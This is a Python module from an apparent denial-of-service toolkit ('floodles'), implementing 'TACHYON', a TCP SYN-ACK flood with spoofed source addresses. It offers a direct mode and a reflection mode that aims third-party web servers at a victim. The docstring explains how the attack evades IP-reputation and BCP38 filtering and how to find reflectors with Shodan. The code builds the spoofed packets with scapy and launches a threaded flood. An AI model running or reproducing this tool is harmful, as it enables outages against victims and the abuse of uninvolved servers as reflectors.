"""
modules/tachyon.py - TACHYON
TCP SYN-ACK flood. Multi-vector TCP handshake exhaustion.

How it works:
  SYN-ACK packets sent to victim with spoofed source IPs (reflectors).

  Normal handshake:
    Client -> SYN   -> Server
    Client <- SYN-ACK <- Server   (server allocates TCB)
    Client -> ACK   -> Server     (connection established)

  SYN-ACK flood (two modes):

  Mode 1 - Direct SYN-ACK flood (no reflector):
    Attacker sends SYN-ACK directly to victim (spoofed src).
    Victim sees unsolicited SYN-ACK -> sends RST.
    CPU cost: RST generation per packet.
    Bypass: harder to filter than SYN (SYN-ACK looks like legitimate response).

  Mode 2 - SYN reflection (use third-party servers as reflectors):
    Attacker sends SYN to reflector (src=victim_ip, dst=reflector:80/443).
    Reflector replies SYN-ACK to victim_ip (legitimate behavior).
    Victim receives SYN-ACK flood from many different IPs.
    Victim sends RST to each reflector -> RST storm against reflectors.

    Effect on victim:
      - RST generation CPU cost
      - Network stack processing per unsolicited SYN-ACK
      - At scale: connection tracking table stress

    Why it's effective:
      - Traffic comes from LEGITIMATE servers (CDNs, web servers)
      - Source IPs are valid -> harder to block by IP reputation
      - Passes most BCP38 filters (traffic is legitimate responses)
      - Amplification: each SYN (60B) generates SYN-ACK (60B) = ~1x but
        distributed across many source IPs

Finding reflectors for Mode 2:
  Any public TCP service: web servers, CDN edge nodes, etc.
  Shodan: port:80 country:XX
  Target: servers with fast SYN-ACK response time

Difference vs SYN flood:
  SYN flood    -> exhausts SERVER state (half-open connections)
  SYN-ACK flood -> exhausts CLIENT/VICTIM network stack (RST generation,
                   connection tracking)
"""

import random
import itertools
from floodles.core.sender import FloodEngine

try:
    from scapy.all import IP, TCP
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


def _build_syn_ack(dst_ip: str, dst_port: int, src_ip: str = None) -> bytes:
    """Build a single SYN-ACK packet."""
    from floodles.core.packet_builder import random_ip, random_port
    src = src_ip if src_ip else random_ip()
    pkt = IP(src=src, dst=dst_ip) / TCP(
        sport=random_port(),
        dport=dst_port,
        flags="SA",
        seq=random.randint(0, 2**32 - 1),
        ack=random.randint(0, 2**32 - 1),
        window=random.choice([8192, 16384, 32768, 65535]),
        options=[("MSS", random.randint(536, 1460))],
    )
    return bytes(pkt)


def _build_syn_to_reflector(reflector_ip: str, reflector_port: int,
                              victim_ip: str) -> bytes:
    """
    Build SYN packet sent to reflector with victim as source.
    Reflector will reply SYN-ACK to victim.
    """
    from floodles.core.packet_builder import random_port
    pkt = IP(src=victim_ip, dst=reflector_ip) / TCP(
        sport=random_port(),
        dport=reflector_port,
        flags="S",
        seq=random.randint(0, 2**32 - 1),
        window=8192,
        options=[("MSS", 1460)],
    )
    return bytes(pkt)


def run(
    dst_ip: str,
    dst_port: int = 80,
    mode: str = "direct",
    reflectors: list[str] = None,
    reflector_port: int = 80,
    threads: int = 8,
    pps_limit: int = 0,
    duration: int = 30,
    spoof: bool = True,
) -> FloodEngine:
    """
    Launch TACHYON SYN-ACK flood.

    Args:
        dst_ip         : Target IP (victim).
        dst_port       : Target port (direct mode only).
        mode           : "direct"    = send SYN-ACK directly to victim (spoofed src).
                         "reflected" = send SYN to reflectors (src=victim) ->
                                       reflectors send SYN-ACK to victim.
        reflectors     : List of reflector IPs (mode="reflected" only).
                         Any public TCP service works as reflector.
        reflector_port : Port to SYN on reflectors (80=HTTP, 443=HTTPS).
        threads        : Worker count.
        pps_limit      : PPS cap.
        duration       : Duration in seconds.
        spoof          : Spoof source IP (direct mode only).

    Returns:
        FloodEngine (already started).
    """
    if not SCAPY_AVAILABLE:
        raise ImportError("scapy required: pip install scapy")

    if mode == "reflected":
        if not reflectors:
            raise ValueError("reflectors required for mode='reflected'")

        reflector_cycle = itertools.cycle(reflectors)

        def make_reflected() -> bytes:
            reflector = next(reflector_cycle)
            return _build_syn_to_reflector(reflector, reflector_port, dst_ip)

        engine = FloodEngine(
            packet_fn=make_reflected,
            dst_ip=reflectors[0],    # nominal dst, actual is per-packet
            threads=threads,
            pps_limit=pps_limit,
            duration=duration,
        )

    else:
        # Direct SYN-ACK flood
        def make_direct() -> bytes:
            return _build_syn_ack(dst_ip, dst_port)

        engine = FloodEngine(
            packet_fn=make_direct,
            dst_ip=dst_ip,
            threads=threads,
            pps_limit=pps_limit,
            duration=duration,
        )

    engine.start()
    return engine
